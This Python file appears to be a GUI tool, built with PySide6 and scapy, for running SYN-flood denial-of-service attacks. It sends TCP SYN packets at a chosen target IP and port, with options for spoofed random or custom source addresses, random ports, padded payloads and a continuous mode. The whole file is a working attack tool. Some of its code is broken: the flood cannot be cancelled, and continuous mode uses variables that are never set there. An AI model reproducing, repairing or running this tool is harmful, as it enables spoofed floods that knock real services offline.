from PySide6.QtWidgets import QApplication, QPushButton, QProgressBar, QTextEdit, QCheckBox, QComboBox
from PySide6.QtUiTools import QUiLoader
from PySide6.QtCore import QFile, Qt
from scapy.all import *
import sys
import random
import requests

app = QApplication([])
app.setStyle("fusion")

file = QFile("syn_flood_ui.ui")
file.open(QFile.ReadOnly)
loader = QUiLoader()
window = loader.load(file)
file.close()

# Variables
FloodRunning = False

# Main
start_flood = window.findChild(QPushButton, "startFlood", Qt.FindChildrenRecursively)
progress_bar = window.findChild(QProgressBar, "progressBar", Qt.FindChildrenRecursively)
ip_mode = window.findChild(QComboBox, "IPMode", Qt.FindChildrenRecursively)
port_mode = window.findChild(QComboBox, "PortMode", Qt.FindChildrenRecursively)
target_ip = window.findChild(QTextEdit, "targetIP", Qt.FindChildrenRecursively)
target_port = window.findChild(QTextEdit, "targetPort", Qt.FindChildrenRecursively)
amount = window.findChild(QTextEdit, "amount", Qt.FindChildrenRecursively)
size = window.findChild(QTextEdit, "dataSize", Qt.FindChildrenRecursively)
continuous = window.findChild(QCheckBox, "continuous", Qt.FindChildrenRecursively)

# Settings
custom_ip = window.findChild(QTextEdit, "customIP", Qt.FindChildrenRecursively)
custom_port = window.findChild(QTextEdit, "customPort", Qt.FindChildrenRecursively)
appearance = window.findChild(QComboBox, "AppearanceDropdown", Qt.FindChildrenRecursively)

# Functions
def start_flood_func(IPMode, PortMode, targetIP, targetPort, Amount, Size, Continuous):
    start_flood.setText("Cancel Flood")
    if Continuous == False:
        total = 0
        FloodRunning = True
        # log packets are sending
        for x in range(0, Amount):
            if FloodRunning == False:
                break

            if IPMode == "Random IP":
                userIP = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
            elif IPMode == "Custom IP":
                userIP = custom_ip.toPlainText()
            elif IPMode == "No Spoofing":
                try:
                    userIP = requests.get("https://api.ipify.org").text
                except requests.RequestException:
                    userIP = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
            
            if PortMode == "Random Port":
                userPort = random.randint(1,9000)
            elif PortMode == "Custom Port":
                userPort = int(custom_port.toPlainText())

            IP_Packet = IP()
            IP_Packet.src = userIP
            IP_Packet.dst = targetIP

            TCP_Packet = TCP()
            TCP_Packet.sport = userPort
            TCP_Packet.dport = targetPort
            TCP_Packet.flags = "S"
            TCP_Packet.seq = 0
            TCP_Packet.window = 0

            send(IP_Packet/TCP_Packet/Raw(load=b"X"*Size), verbose=0)
            total += 1
        FloodRunning = False
        start_flood.setText("Start Flood")
        # log total packets sent

    elif Continuous == True:
        total = 0
        FloodRunning = True
        # log packets are sending continuously
        while FloodRunning == True:
            IP_Packet = IP()
            IP_Packet.src = userIP
            IP_Packet.dst = targetIP

            TCP_Packet = TCP()
            TCP_Packet.sport = userPort
            TCP_Packet.dport = targetPort
            TCP_Packet.flags = "S"
            TCP_Packet.seq = 1
            TCP_Packet.window = 0

            send(IP_Packet/TCP_Packet, verbose=0)
            total += 1
        # log total packets sent

def cancel_flood_func():
    FloodRunning = False
    start_flood.setText("Start Flood")

def change_appearance_func(text):
    if text == "Windows Vista":
        app.setStyle("windowsvista")
    elif text == "Windows":
        app.setStyle("windows")
    elif text == "Fusion":
        app.setStyle("fusion")
    window.update()
    window.repaint()

# Code
start_flood.clicked.connect(
    lambda: start_flood_func(
        ip_mode.currentText(),
        port_mode.currentText(),
        target_ip.toPlainText(),
        int(target_port.toPlainText()),
        int(amount.toPlainText()) if amount.toPlainText() else 1,
        int(size.toPlainText()) if size.toPlainText() else 0,
        continuous.isChecked()
    )
)
appearance.currentTextChanged.connect(change_appearance_func)

window.show()
sys.exit(app.exec())